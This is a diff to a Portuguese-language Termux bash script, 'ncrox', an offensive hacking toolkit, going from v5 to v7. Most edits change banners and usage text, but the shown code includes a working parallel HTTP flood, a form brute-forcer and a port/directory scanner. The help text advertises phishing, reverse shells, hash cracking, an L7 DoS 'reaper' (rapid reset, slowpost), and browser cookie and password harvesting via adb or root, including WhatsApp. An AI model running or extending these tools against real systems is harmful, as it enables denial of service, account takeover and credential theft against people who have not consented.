@@ -1,8 +1,8 @@
 #!/data/data/com.termux/files/usr/bin/bash
 # ==========================================================================
-#  ncrox :: termux edition  —  single file  (v5)
-#  Porte do Satanachia ncrox + arsenal + nhack + htx/reaper/oztek
-#  Uso: bash ncrox.sh [install|update|restore]
+#   (v7)
+#  CHAMADA: ncrox <comando> [args]   |   ncx-<comando> [args]
+#  Instalar: bash ncrox.sh     |    Diagnóstico: ncrox doctor
 # ==========================================================================
 set -uo pipefail
 
@@ -19,7 +19,7 @@ RBIN="$NCROX_HOME/bin"
 PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
 BIN="$PREFIX/bin"
 
-if [ -t 1 ]; then
+if [ -t 1 ] && [ -z "${NCROX_PLAIN:-}" ]; then
   O=$'\e[38;2;255;122;0m'; B=$'\e[38;2;30;144;255m'; D=$'\e[38;2;90;95;107m'
   G=$'\e[38;2;61;220;132m'; RD=$'\e[38;2;255;77;77m'; R=$'\e[0m'
 else
@@ -34,11 +34,10 @@ ART=' _   _  ____ ____   ___  __  __
 
 banner() {
   printf '\n%s%s%s\n' "$O" "$ART" "$R"
-  printf '%s   s a t a n a c h i a  ·  n c r o x  ·  t e r m u x%s\n' "$B" "$R"
-  printf '%s   ──────────────────────────────────────────────%s\n' "$D" "$R"
-  printf '%s   help | ncrox for hack | ncx-port | ncx-dir | ncx-brute | ncx-flood%s\n' "$D" "$R"
-  printf '%s   ncx-rev | ncx-phish | ncx-crack | ncx-takeover%s\n' "$D" "$R"
-  printf '%s   ncx-htx | ncx-reap | ncx-oz%s\n\n' "$D" "$R"
+  printf '%s   ncrox :: termux edition%s\n' "$B" "$R"
+  printf '%s   ----------------------------------------------%s\n' "$D" "$R"
+  printf '%s   chamada: ncrox <comando>   |   ncx-<comando>%s\n' "$D" "$R"
+  printf '%s   ncrox help  ·  ncrox doctor%s\n\n' "$D" "$R"
 }
 
 need_termux() {
@@ -47,13 +46,14 @@ need_termux() {
 }
 
 deps() {
-  printf '%s[*]%s dependências base...\n' "$B" "$R"
+  printf '%s[*]%s instalando dependências...\n' "$B" "$R"
   yes | pkg update -y >/dev/null 2>&1 || true
   for p in python git curl openssl-tool dnsutils whois jq findutils ncurses-utils termux-tools \
-           ncat netcat-openbsd rlwrap gzip tar unzip zip; do
-    command -v "${p%%-*}" >/dev/null 2>&1 || pkg install -y "$p" >/dev/null 2>&1 || true
+           ncat netcat-openbsd rlwrap gzip tar unzip zip net-tools iproute2 nmap; do
+    pkg install -y "$p" >/dev/null 2>&1 || true
   done
-  printf '%s[+]%s base pronta\n' "$G" "$R"
+  printf '%s[+]%s dependências base prontas\n' "$G" "$R"
+  printf '%s[*]%s opcionais: pkg install golang nodejs android-tools ffmpeg chafa tcpdump dsniff%s\n' "$D" "$R"
 }
 
 fetch_ncrox() {
@@ -64,7 +64,7 @@ fetch_ncrox() {
     printf '%s[*]%s clonando ncrox...\n' "$B" "$R"
     git clone --depth 1 "$REPO" "$SRC" >/dev/null 2>&1 \
       && printf '%s[+]%s fonte em %s\n' "$G" "$R" "$SRC" \
-      || { printf '%s[!]%s clone falhou — réplica cobre.\n' "$RD" "$R"; mkdir -p "$SRC"; }
+      || { printf '%s[!]%s clone falhou — réplica cobre tudo.\n' "$RD" "$R"; mkdir -p "$SRC"; }
   fi
 }
 
@@ -3693,12 +3693,9 @@ if __name__ == "__main__":
 PY
 
   chmod +x "$TOOLS"/*.py
-  printf '%s[+]%s ferramentas embutidas gravadas\n' "$G" "$R"
+  printf '%s[+]%s auxiliares gravados\n' "$G" "$R"
 }
 
-# ==========================================================================
-#  build do reaper
-# ==========================================================================
 reap_build() {
   command -v go >/dev/null 2>&1 || {
     printf '%s[*]%s instalando golang...\n' "$B" "$R"; pkg install -y golang >/dev/null 2>&1 || true; }
@@ -3721,8 +3718,7 @@ write_lib() {
   mkdir -p "$(dirname "$LIB")"
   cat > "$LIB" <<'LIBEOF'
 #!/usr/bin/env bash
-# ncrox replica lib
-NCROX_REPO_DIR="$HOME/.ncrox/src"
+# ncrox lib — chamada canônica: ncrox <cmd>  |  ncx-<cmd>
 WL_DIR="$HOME/.ncrox/wordlists"
 HACK_DIR="$HOME/.ncrox/hack"
 TMPD="$HOME/.ncrox/tmp"
@@ -3730,14 +3726,14 @@ TOOLS="$HOME/.ncrox/tools"
 RBIN="$HOME/.ncrox/bin"
 HACK_REPO="N3CR0-X/ncroxhack"
 WL_BASE="https://raw.githubusercontent.com/danielmiessler/SecLists/master"
-if [ -t 1 ]; then
+if [ -t 1 ] && [ -z "${NCROX_PLAIN:-}" ]; then
   O=$'\e[38;2;255;122;0m'; B=$'\e[38;2;30;144;255m'; D=$'\e[38;2;90;95;107m'
   G=$'\e[38;2;61;220;132m'; RD=$'\e[38;2;255;77;77m'; Y=$'\e[38;2;255;200;0m'; R=$'\e[0m'
 else
   O=; B=; D=; G=; RD=; Y=; R=
 fi
-_hr(){ printf '%s────────────────────────────────────────────%s\n' "$D" "$R"; }
-_tag(){ printf '\n%s┌─ %s%s\n%s└%s\n' "$O" "$1" "$R" "$O" "$R"; }
+_hr(){ printf '%s----------------------------------------%s\n' "$D" "$R"; }
+_tag(){ printf '\n%s== %s ==%s\n' "$O" "$1" "$R"; }
 
 ncx_banner(){
   printf '\n%s _   _  ____ ____   ___  __  __%s\n' "$O" "$R"
@@ -3745,12 +3741,58 @@ ncx_banner(){
   printf '%s|  \\| | |   | |_) | | | | \\  /%s\n' "$O" "$R"
   printf '%s| . ` | |___|  _ <| |_| | /  \\%s\n' "$O" "$R"
   printf '%s|_|\\__|\\____|_| \\_\\\\___//_/\\_\\%s\n' "$O" "$R"
-  printf '%ssatanachia · termux edition%s\n' "$B" "$R"
+  printf '%scomandos: ncrox help%s\n' "$B" "$R"
+}
+
+_resolv(){
+  local h="${1:-}" out=""
+  [ -z "$h" ] && return 1
+  if command -v dig >/dev/null 2>&1; then
+    out=$(dig +short A "$h" 2>/dev/null)
+  elif command -v nslookup >/dev/null 2>&1; then
+    out=$(nslookup "$h" 2>/dev/null | awk '/^Address: /{print $2}' | tail -n +2)
+  fi
+  if [ -z "$out" ]; then
+    out=$(python3 - "$h" <<'PY' 2>/dev/null
+import socket, sys
+try:
+    for r in socket.getaddrinfo(sys.argv[1], None, socket.AF_INET):
+        print(r[4][0])
+except Exception:
+    pass
+PY
+)
+  fi
+  printf '%s\n' "$out" | grep -E '^[0-9]+\.' | awk '!s[$0]++'
+}
+_first_ip(){ _resolv "${1:-}" | head -1; }
+_cname(){
+  local h="${1:-}"
+  if command -v dig >/dev/null 2>&1; then dig +short CNAME "$h" 2>/dev/null
+  elif command -v nslookup >/dev/null 2>&1; then
+    nslookup -type=CNAME "$h" 2>/dev/null | awk '/canonical name|nome canônico/{print $NF}' | tr -d '.'
+  fi
+}
+_myip(){
+  python3 - <<'PY' 2>/dev/null
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+try:
+    s.connect(("1.1.1.1", 53)); print(s.getsockname()[0])
+except Exception:
+    try: print(socket.gethostbyname(socket.gethostname()))
+    except Exception: pass
+PY
 }
 
 ncx_help(){
   _tag "ncrox · comandos"
   cat <<'H'
+ CHAMADA (as duas formas valem)
+   ncrox <comando> [args]
+   ncx-<comando> [args]
+   exemplo: ncrox dns exemplo.com    |    ncx-dns exemplo.com
+
  AUDITORIA
    vigia <host> [portas]      varredura TCP em host único
    oraculo <dominio>          resolução DNS A/AAAA
@@ -3758,50 +3800,78 @@ ncx_help(){
    selo <arquivo> [sha256]    SHA-256 local e comparação
 
  REDE / WEB
-   dns | whois | net | ip a | search <termo>
+   dns <dominio>              resolve A/AAAA
+   whois <dominio>            RDAP
+   net                        interfaces locais
+   search <termo>             busca web
    web get|title|links|status|headers <url>
    github repo|user|releases|issues|search <x>
-   ondeuto -ip
+   ondeuto -ip                geolocalização do IP público
 
  OFENSIVO
-   ncx-port     <host> [top|all|lista] [-t N] [-b]
-   ncx-dir      <url> [-w lista] [-t N] [-x ext]
-   ncx-brute    <url> <campo_user> <campo_pass> [-u] [-p] [-s] [-c]
-   ncx-flood    <url> [-c conc] [-n req] [-m metodo]
-   ncx-sub      <dominio> [-w lista]
-   ncx-takeover <dominio> [-w lista] [-t N]
-   ncx-crack    <hash> [-w lista] [-r regras] [-t N]
-   ncx-phish    <porta> [url_alvo] [-t titulo] [-d destino] [-r template]
+   port     <host> [top|all|lista] [-t N] [-b]
+   dir      <url> [-w lista] [-t N] [-x ext]
+   brute    <url> <campo_user> <campo_pass> [-u] [-p] [-s] [-c]
+   flood    <url> [-c conc] [-n req] [-m metodo]
+   sub      <dominio> [-w lista]
+   takeover <dominio> [-w lista] [-t N]
+   crack    <hash> [-w lista] [-r regras] [-t N]
+   phish    <porta> [url_alvo] [-t titulo] [-d destino] [-r template]
 
- ARSENAL PESADO
-   ncx-htx   <cmd>     colheita de navegador, zap silencioso, lure, stego
-   ncx-reap  -l        L7 reaper: h2, rapid reset, hpack, syn, slowpost
-   ncx-oz    --help    recon ofensivo silencioso em LAN (ARP, ADB, RTSP, VNC)
+ ARSENAL
+   htx   <cmd>    colheita de navegador, zap, lure, stego
+   reap  -l       L7 reaper (h2, rapid reset, hpack, syn, slowpost)
+   oz    --help   recon ofensivo silencioso em LAN
 
  REVERSE SHELL
-   ncx-rev <lhost> <lport> [-t tipo] [-a] [-u] [-b] [-i] [-l]
-   ncx-listen <porta>
+   rev <lhost|-> <lport> [-t tipo] [-u] [-b] [-i] [-l]
+   listen <porta>
 
  NHACK
    ncrox for hack | nhack list | nhack pick <zip> | nhack -st <zip> | nhack rm <t>
 
  WORDLISTS
-   ncx-wordlists list|update|get <n>|rockyou|clean
+   wordlists list|update|get <n>|rockyou|clean
+
+ MANUTENÇÃO
+   doctor | settings | ncrox-update | ncrox-restore
 
  UTILITÁRIOS
    hash | base64 | urlinfo | jsoncheck | comparar | fileinfo | uuid | netcheck
    sysinfo | disk | which | where | findtext | rede | tree | readmd | device
    battery | storage | screen | uptime | locale | timezone | volume | ringer
-   say | open | pack | docs | applist | tasklist | settings
+   say | open | pack | docs | applist | tasklist
 H
+  _hr
+}
+
+ncx_doctor(){
+  _tag "doctor"
+  local miss=0 c
+  for c in python3 curl git unzip jq dig nslookup ncat nc rlwrap openssl ssh gzip tar; do
+    if command -v "$c" >/dev/null 2>&1; then printf '  %sok%s     %s\n' "$G" "$R" "$c"
+    else printf '  %sFALTA%s  %s\n' "$RD" "$R" "$c"; miss=$((miss+1)); fi
+  done
+  printf '\n'
+  for c in node go nmap adb ffmpeg chafa tcpdump arpspoof; do
+    command -v "$c" >/dev/null 2>&1 && printf '  %sok%s     %s (opcional)\n' "$G" "$R" "$c" \
+      || printf '  %s--%s     %s (opcional)\n' "$D" "$R" "$c"
+  done
+  printf '\n  DNS localhost: %s\n' "$(_resolv localhost | head -1)"
+  printf '  IP local: %s\n' "$(_myip)"
+  printf '  lib: %s\n' "$([ -f "$HOME/.ncrox/lib/ncrox_lib.sh" ] && echo ok || echo FALTA)"
+  printf '  launchers: %s\n' "$(ls "$PREFIX/bin"/ncx-* 2>/dev/null | wc -l)"
+  printf '  wordlists: %s\n' "$(ls "$WL_DIR" 2>/dev/null | wc -l)"
+  if [ "$miss" = 0 ]; then printf '\n  %sessencial completo%s\n' "$G" "$R"
+  else printf '\n  %s%s essencial(is) faltando — pkg install -y%s\n' "$RD" "$miss" "$R"; fi
   _hr
 }
 
 # ---------- auditoria ----------
 ncx_vigia(){
   local host="${1:-}" ports="${2:-22,80,443,8080}" n=0 p ip
-  [ -z "$host" ] && { echo "uso: vigia <host> [porta,porta,...]"; return 1; }
-  ip=$(getent hosts "$host" 2>/dev/null | awk 'NR==1{print $1}'); [ -z "$ip" ] && ip="$host"
+  [ -z "$host" ] && { echo "uso: ncrox vigia <host> [porta,porta,...]"; return 1; }
+  ip=$(_first_ip "$host"); [ -z "$ip" ] && ip="$host"
   _tag "vigia :: $host ($ip)"
   for p in ${ports//,/ }; do
     if timeout 1 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null; then
@@ -3811,15 +3881,16 @@ ncx_vigia(){
   _hr; printf 'abertas: %s\n' "$n"
 }
 ncx_oraculo(){
-  local d="${1:-}"; [ -z "$d" ] && { echo "uso: oraculo <dominio>"; return 1; }
+  local d="${1:-}" out
+  [ -z "$d" ] && { echo "uso: ncrox oraculo <dominio>"; return 1; }
   _tag "oraculo :: $d"
-  getent hosts "$d" 2>/dev/null || echo "  sem resolução"
-  command -v dig >/dev/null && dig +short "$d" 2>/dev/null
+  out=$(_resolv "$d")
+  [ -z "$out" ] && echo "  sem resolução" || printf '  %s\n' "$out"
   _hr
 }
 ncx_bastiao(){
   local h="${1:-}" p="${2:-443}"
-  [ -z "$h" ] && { echo "uso: bastiao <host> [porta]"; return 1; }
+  [ -z "$h" ] && { echo "uso: ncrox bastiao <host> [porta]"; return 1; }
   _tag "bastiao :: $h:$p"
   timeout 8 openssl s_client -connect "$h:$p" -servername "$h" </dev/null 2>&1 \
     | grep -Ei 'verify return code|protocol *:|cipher *:|subject=|issuer=' | sed 's/^/  /'
@@ -3827,7 +3898,7 @@ ncx_bastiao(){
 }
 ncx_selo(){
   local f="${1:-}" want="${2:-}" got
-  [ -f "$f" ] || { echo "uso: selo <arquivo> [sha256]"; return 1; }
+  [ -f "$f" ] || { echo "uso: ncrox selo <arquivo> [sha256]"; return 1; }
   got=$(sha256sum "$f" | awk '{print $1}')
   _tag "selo :: $f"; echo "  $got"
   if [ -n "$want" ]; then
@@ -3837,7 +3908,7 @@ ncx_selo(){
 
 # ---------- web ----------
 ncx_search(){
-  local q="${*:-}"; [ -z "$q" ] && { echo "uso: search <termo>"; return 1; }
+  local q="${*:-}"; [ -z "$q" ] && { echo "uso: ncrox search <termo>"; return 1; }
   _tag "search :: $q"
   curl -s -m 15 "https://www.bing.com/search?q=${q// /+}&format=rss" \
    | grep -oE '<title>[^<]+</title>|<link>[^<]+</link>' | sed -e 's/<[^>]*>//g' \
@@ -3846,7 +3917,7 @@ ncx_search(){
 }
 ncx_web(){
   local a="${1:-}" u="${2:-}"
-  [ -z "$u" ] && { echo "uso: web get|title|links|status|headers <url>"; return 1; }
+  [ -z "$u" ] && { echo "uso: ncrox web get|title|links|status|headers <url>"; return 1; }
   case "$a" in
     get|source) curl -sL -m 20 "$u" | head -c 4000 ;;
     title) curl -sL -m 15 "$u" | grep -oiE '<title>[^<]*' | head -1 | sed 's/<title>//I' ;;
@@ -3857,11 +3928,19 @@ ncx_web(){
     *) echo "ação inválida" ;;
   esac
 }
-ncx_dns(){ [ -z "${1:-}" ] && { echo "uso: dns <dominio>"; return 1; }; getent hosts "$1" || echo "sem resolução"; }
-ncx_whois(){ [ -z "${1:-}" ] && return 1; curl -s -m 15 "https://rdap.org/domain/$1" | head -c 2500; echo; }
+ncx_dns(){
+  local d="${1:-}" out
+  [ -z "$d" ] && { echo "uso: ncrox dns <dominio>"; return 1; }
+  out=$(_resolv "$d")
+  if [ -z "$out" ]; then echo "sem resolução: $d"; return 1; fi
+  printf '%s\n' "$out"
+}
+ncx_whois(){ [ -z "${1:-}" ] && { echo "uso: ncrox whois <dominio>"; return 1; }; curl -s -m 15 "https://rdap.org/domain/$1" | head -c 2500; echo; }
 ncx_net(){
   _tag "net"
-  ip -o addr 2>/dev/null | awk '{print "  "$2" "$4}' || ifconfig 2>/dev/null | grep -E 'inet |^[a-z]'
+  if command -v ip >/dev/null 2>&1; then ip -o addr 2>/dev/null | awk '{print "  "$2" "$4}'
+  elif command -v ifconfig >/dev/null 2>&1; then ifconfig 2>/dev/null | grep -E 'inet |^[a-z]'
+  else python3 -c "import socket;print(socket.gethostbyname_ex(socket.gethostname()))" 2>/dev/null; fi
   _hr
 }
 ncx_github(){
@@ -3872,7 +3951,7 @@ ncx_github(){
     releases) curl -s -m 15 "https://api.github.com/repos/$x/releases" | grep -E '"(tag_name|name)"' | head -10 ;;
     issues) curl -s -m 15 "https://api.github.com/repos/$x/issues" | grep -E '"(title|state)"' | head -10 ;;
     search) curl -s -m 15 "https://api.github.com/search/repositories?q=${x// /+}" | grep '"full_name"' | head -10 ;;
-    *) echo "uso: github repo|user|releases|issues|search <x>" ;;
+    *) echo "uso: ncrox github repo|user|releases|issues|search <x>" ;;
   esac
 }
 ncx_ondeuto(){ curl -s -m 12 https://ipapi.co/json/ | grep -E '"(ip|city|region|country_name|org)"'; }
@@ -3917,12 +3996,12 @@ ncx_wordlists(){
     list)
       _tag "wordlists locais"
       ls -1 "$WL_DIR" 2>/dev/null | sed -e 's/\.txt\.gz$//' -e 's/\.txt$//' | sort -u | sed 's/^/  /'
-      [ -z "$(ls -A "$WL_DIR" 2>/dev/null)" ] && echo "  (vazio — ncx-wordlists update)"
-      echo; echo "  catálogo: ncx-wordlists catalog"; _hr ;;
+      [ -z "$(ls -A "$WL_DIR" 2>/dev/null)" ] && echo "  (vazio — ncrox wordlists update)"
+      echo; echo "  catálogo: ncrox wordlists catalog"; _hr ;;
     catalog) wl_catalog | sed 's/|/  ->  /' | sed 's/^/  /' ;;
     update) while IFS='|' read -r n p; do _wl_get "$n" "$p"; done < <(wl_catalog); _hr ;;
     get)
-      [ -z "${2:-}" ] && { echo "uso: ncx-wordlists get <nome>"; return 1; }
+      [ -z "${2:-}" ] && { echo "uso: ncrox wordlists get <nome>"; return 1; }
       p=$(wl_catalog | awk -F'|' -v k="$2" '$1==k{print $2}' | head -1)
       [ -z "$p" ] && { echo "nome desconhecido: $2"; return 1; }
       _wl_get "$2" "$p" ;;
@@ -3937,7 +4016,7 @@ ncx_wordlists(){
     auto) for n in common dns5000 10k users pass-short; do
             p=$(wl_catalog | awk -F'|' -v k="$n" '$1==k{print $2}' | head -1)
             [ -n "$p" ] && _wl_get "$n" "$p"; done ;;
-    *) echo "uso: ncx-wordlists list|update|get <n>|rockyou|clean" ;;
+    *) echo "uso: ncrox wordlists list|update|get <n>|rockyou|clean" ;;
   esac
 }
 
@@ -3957,11 +4036,11 @@ nhack_list(){
     printf '%s\n' "$out" | while IFS=$'\t' read -r n s; do
       printf '  %s%-36s%s %7s KB\n' "$O" "$n" "$R" "$(( ${s:-0} / 1024 ))"; done
   fi
-  echo; echo "  baixar: nhack pick <tool.zip>"; echo "  instalar: nhack -st <tool.zip>"; _hr
+  echo; echo "  baixar: ncrox nhack pick <tool.zip>"; echo "  instalar: ncrox nhack -st <tool.zip>"; _hr
 }
-nhack_search(){ [ -z "${1:-}" ] && { echo "uso: nhack search <termo>"; return 1; }; nhack_list | grep -i -- "$1"; }
+nhack_search(){ [ -z "${1:-}" ] && { echo "uso: ncrox nhack search <termo>"; return 1; }; nhack_list | grep -i -- "$1"; }
 nhack_pick(){
-  local n="${1:-}"; [ -z "$n" ] && { echo "uso: nhack pick <tool.zip>"; return 1; }
+  local n="${1:-}"; [ -z "$n" ] && { echo "uso: ncrox nhack pick <tool.zip>"; return 1; }
   case "$n" in *.zip) ;; *) n="$n.zip" ;; esac
   case "$n" in */*|*..*) echo "nome inválido"; return 1 ;; esac
   mkdir -p "$HACK_DIR/dl"
@@ -3973,17 +4052,17 @@ nhack_pick(){
   unzip -tqq "$out" >/dev/null 2>&1 || { printf '%s[!]%s zip corrompido\n' "$RD" "$R"; rm -f "$out"; return 1; }
   printf '%s[+]%s %s (%s KB)\n' "$G" "$R" "$out" "$(( $(stat -c%s "$out") / 1024 ))"
   printf '    sha256: %s\n' "$(sha256sum "$out" | awk '{print $1}')"
-  printf '    instalar: nhack -st %s\n' "$n"; _hr
+  printf '    instalar: ncrox nhack -st %s\n' "$n"; _hr
 }
 nhack_st(){
   local run=1 n=""
   while [ $# -gt 0 ]; do case "$1" in
     --no-run) run=0; shift;; *) n="$1"; shift;; esac; done
-  [ -z "$n" ] && { echo "uso: nhack -st <tool.zip> [--no-run]"; return 1; }
+  [ -z "$n" ] && { echo "uso: ncrox nhack -st <tool.zip> [--no-run]"; return 1; }
   case "$n" in *.zip) ;; *) n="$n.zip" ;; esac
   local zip="$HACK_DIR/dl/$n" tool="${n%.zip}"
-  [ -f "$zip" ] || { echo "não baixado: $n — use nhack pick $n"; return 1; }
-  [ -d "$HACK_DIR/$tool" ] && { printf '%s[!]%s já instalado (nhack rm %s)\n' "$RD" "$R" "$tool" "$tool"; return 1; }
+  [ -f "$zip" ] || { echo "não baixado: $n — use ncrox nhack pick $n"; return 1; }
+  [ -d "$HACK_DIR/$tool" ] && { printf '%s[!]%s já instalado (ncrox nhack rm %s)\n' "$RD" "$R" "$tool" "$tool"; return 1; }
   unzip -Z1 "$zip" | grep -qE '^/|(^|/)\.\.(/|$)' && { echo "zip com caminho absoluto ou .."; return 1; }
   mkdir -p "$HACK_DIR/env" "$PREFIX/bin"
   local tmp; tmp=$(mktemp -d "$HACK_DIR/.tmp.XXXXXX") || return 1
@@ -4022,7 +4101,7 @@ nhack_st(){
     printf '  %s[*]%s executando %s\n' "$B" "$R" "$(basename "$SETUP")"
     bash "$SETUP" 2>&1 | tail -30
   fi
-  printf '  remover: nhack rm %s\n' "$tool"; _hr
+  printf '  remover: ncrox nhack rm %s\n' "$tool"; _hr
 }
 nhack_get(){ nhack_pick "${1:-}" || return 1; nhack_st "${1:-}"; }
 nhack_installed(){
@@ -4033,7 +4112,7 @@ nhack_installed(){
   _hr
 }
 nhack_rm(){
-  local t="${1:-}"; [ -z "$t" ] && { echo "uso: nhack rm <tool>"; return 1; }
+  local t="${1:-}"; [ -z "$t" ] && { echo "uso: ncrox nhack rm <tool>"; return 1; }
   [ -d "$HACK_DIR/$t" ] || { echo "não instalado: $t"; return 1; }
   find "$PREFIX/bin" -maxdepth 1 -type l -lname "$HACK_DIR/$t/*" -delete 2>/dev/null
   rm -rf "$HACK_DIR/$t" "$HOME/.venvs/nhack-$t"
@@ -4049,47 +4128,51 @@ ncx_nhack(){
     -st|--st|st) nhack_st "$@" ;;
     installed|-i) nhack_installed ;;
     rm|remove) nhack_rm "$@" ;;
-    -h|--help) echo "uso: nhack list|search <t>|pick <zip>|-st <zip>|get <zip>|installed|rm <t>" ;;
+    -h|--help) echo "uso: ncrox nhack list|search <t>|pick <zip>|-st <zip>|get <zip>|installed|rm <t>" ;;
     *) nhack_get "$a" ;;
   esac
 }
 
-# ---------- arsenal pesado ----------
+# ---------- arsenal ----------
 ncx_htx(){
   case "${1:-}" in
     -h|--help)
-      _tag "ncx-htx"
+      _tag "htx"
       cat <<'H'
-  htx.py — colheita real de navegador + zap + lure + stego
+  htx — colheita real de navegador + zap + lure + stego
 
-  ncx-htx                       sobe painel + túnel público (QR do zap)
-  ncx-htx wa                    idem, com pareamento WhatsApp ativo
-  ncx-htx --no-tunnel           só local, sem túnel
-  ncx-htx --port 9000           porta alternativa
-  ncx-htx harvest [all|cdp|root|wa]   colheita pontual
-  ncx-htx add <url> [google|instagram|facebook] [stay|watch]
-  ncx-htx stego <capa.jpg> <url>       esconde URL após o EOI
-  ncx-htx unstego <arquivo.jpg>        extrai
+  ncrox htx                      sobe painel + túnel público
+  ncrox htx wa                   idem, com pareamento WhatsApp
+  ncrox htx --no-tunnel          só local
+  ncrox htx --port 9000          outra porta
+  ncrox htx harvest [all|cdp|root|wa]
+  ncrox htx add <url> [google|instagram|facebook] [stay|watch]
+  ncrox htx stego <capa.jpg> <url>
+  ncrox htx unstego <arquivo.jpg>
 
-  cdp  = Chrome com depuração (adb) — sessão viva, sem root
-  root = /data/data com su ou tsu — cookies e senhas em disco
+  cdp = Chrome com depuração via adb (sessão viva, sem root)
+  root = /data/data com su/tsu (cookies e senhas em disco)
 H
       _hr; return 0 ;;
   esac
+  [ -f "$TOOLS/htx.py" ] || { printf '%s[!]%s htx.py ausente — reinstale\n' "$RD" "$R"; return 1; }
   if [ "${1:-}" = "wa" ] && ! command -v node >/dev/null 2>&1; then
-    printf '%s[*]%s instalando nodejs para o modo zap...\n' "$B" "$R"; pkg install -y nodejs >/dev/null 2>&1 || true
+    printf '%s[*]%s instalando nodejs...\n' "$B" "$R"; pkg install -y nodejs >/dev/null 2>&1 || true
   fi
   python3 "$TOOLS/htx.py" "$@"
 }
 ncx_reap(){
   local b="$RBIN/reaper"
   if [ ! -x "$b" ]; then
-    printf '%s[*]%s reaper não compilado, compilando...\n' "$B" "$R"
+    printf '%s[*]%s compilando reaper...\n' "$B" "$R"
     reap_build >/dev/null 2>&1 || { printf '%s[!]%s build falhou (pkg install golang)\n' "$RD" "$R"; return 1; }
   fi
   "$b" "$@"
 }
-ncx_oz(){ python3 "$TOOLS/oztek.py" "$@"; }
+ncx_oz(){
+  [ -f "$TOOLS/oztek.py" ] || { printf '%s[!]%s oztek.py ausente — reinstale\n' "$RD" "$R"; return 1; }
+  python3 "$TOOLS/oztek.py" "$@"
+}
 
 # ---------- ofensivo ----------
 _portlist(){
@@ -4111,14 +4194,14 @@ _probe(){
   fi
 }
 ncx_port(){
-  local host="" ports="top" thr=150 tmo=1 grab=0
+  local host="" ports="top" thr=150 tmo=1 grab=0 ip n=0 p
   while [ $# -gt 0 ]; do case "$1" in
     -t) thr="${2:-150}"; shift 2;; -w) tmo="${2:-1}"; shift 2;; -b) grab=1; shift;;
-    -h|--help) echo "uso: ncx-port <host> [top|all|p1,p2] [-t threads] [-w timeout] [-b]"; return 0;;
+    -h|--help) echo "uso: ncrox port <host> [top|all|p1,p2] [-t threads] [-w timeout] [-b]"; return 0;;
     *) [ -z "$host" ] && host="$1" || ports="$1"; shift;; esac; done
-  [ -z "$host" ] && { echo "uso: ncx-port <host> [top|all|p1,p2]"; return 1; }
-  local ip n=0; ip=$(getent hosts "$host" 2>/dev/null | awk 'NR==1{print $1}'); [ -z "$ip" ] && ip="$host"
-  _tag "ncx-port :: $host ($ip) :: $ports :: ${thr} threads"
+  [ -z "$host" ] && { echo "uso: ncrox port <host> [top|all|p1,p2]"; return 1; }
+  ip=$(_first_ip "$host"); [ -z "$ip" ] && ip="$host"
+  _tag "port :: $host ($ip) :: $ports :: ${thr} threads"
   while read -r p; do
     [ -z "$p" ] && continue
     _probe "$ip" "$p" "$tmo" "$grab" &
@@ -4133,11 +4216,11 @@ ncx_dir(){
   local url="" wl="" thr=30 ext="" codes="200,204,301,302,307,401,403" n=0 w f
   while [ $# -gt 0 ]; do case "$1" in
     -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;; -x) ext="$2"; shift 2;;
-    -c) codes="$2"; shift 2;; -h|--help) echo "uso: ncx-dir <url> [-w lista] [-t threads] [-x ext]"; return 0;;
+    -c) codes="$2"; shift 2;; -h|--help) echo "uso: ncrox dir <url> [-w lista] [-t threads] [-x ext]"; return 0;;
     *) url="$1"; shift;; esac; done
-  [ -z "$url" ] && { echo "uso: ncx-dir <url> [-w lista]"; return 1; }
+  [ -z "$url" ] && { echo "uso: ncrox dir <url> [-w lista]"; return 1; }
   url="${url%/}"
-  _tag "ncx-dir :: $url :: ${thr} threads${wl:+ :: $wl}"
+  _tag "dir :: $url :: ${thr} threads${wl:+ :: $wl}"
   _dir_one(){
     local u="$1" w="$2" e="$3" codes="$4" out code len
     out=$(curl -s -o /dev/null -m 8 -w '%{http_code} %{size_download}' "$u/$w$e")
@@ -4164,11 +4247,11 @@ ncx_brute(){
   while [ $# -gt 0 ]; do case "$1" in
     -u) ul="${2:-}"; shift 2;; -p) pl="${2:-}"; shift 2;; -s) ok="${2:-}"; shift 2;;
     -f) fail="${2:-}"; shift 2;; -c) okc="${2:-}"; shift 2;; -t) thr="${2:-20}"; shift 2;;
-    -h|--help) echo "uso: ncx-brute <url> <campo_user> <campo_pass> [-u users] [-p passes] [-s ok] [-c code]"; return 0;;
+    -h|--help) echo "uso: ncrox brute <url> <campo_user> <campo_pass> [-u users] [-p passes] [-s ok] [-c code]"; return 0;;
     *) if [ -z "$url" ]; then url="$1"; elif [ -z "$uf" ]; then uf="$1"; elif [ -z "$pf" ]; then pf="$1"; fi; shift;;
   esac; done
-  { [ -z "$url" ] || [ -z "$uf" ] || [ -z "$pf" ]; } && { echo "uso: ncx-brute <url> <campo_user> <campo_pass>"; return 1; }
-  _tag "ncx-brute :: $url :: $uf/$pf :: ${thr} threads"
+  { [ -z "$url" ] || [ -z "$uf" ] || [ -z "$pf" ]; } && { echo "uso: ncrox brute <url> <campo_user> <campo_pass>"; return 1; }
+  _tag "brute :: $url :: $uf/$pf :: ${thr} threads"
   _brute_one(){
     local url="$1" uf="$2" pf="$3" u="$4" p="$5" ok="$6" fail="$7" okc="$8"
     local out body code len hit=0
@@ -4204,10 +4287,10 @@ ncx_flood(){
   local url="" conc=50 total=500 m=GET t0 t1 i
   while [ $# -gt 0 ]; do case "$1" in
     -c) conc="$2"; shift 2;; -n) total="$2"; shift 2;; -m) m="$2"; shift 2;;
-    -h|--help) echo "uso: ncx-flood <url> [-c conc] [-n total] [-m GET|POST]"; return 0;;
+    -h|--help) echo "uso: ncrox flood <url> [-c conc] [-n total] [-m GET|POST]"; return 0;;
     *) url="$1"; shift;; esac; done
-  [ -z "$url" ] && { echo "uso: ncx-flood <url> [-c 50] [-n 500]"; return 1; }
-  _tag "ncx-flood :: $url :: $total/$conc"
+  [ -z "$url" ] && { echo "uso: ncrox flood <url> [-c 50] [-n 500]"; return 1; }
+  _tag "flood :: $url :: $total/$conc"
   t0=$(date +%s.%N)
   for i in $(seq 1 "$total"); do
     curl -s -o /dev/null -m 15 -X "$m" -w '%{http_code}\n' "$url" &
@@ -4223,9 +4306,9 @@ ncx_sub(){
   local dom="" wl="" thr=30 n=0 w f
   while [ $# -gt 0 ]; do case "$1" in
     -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;; *) dom="$1"; shift;; esac; done
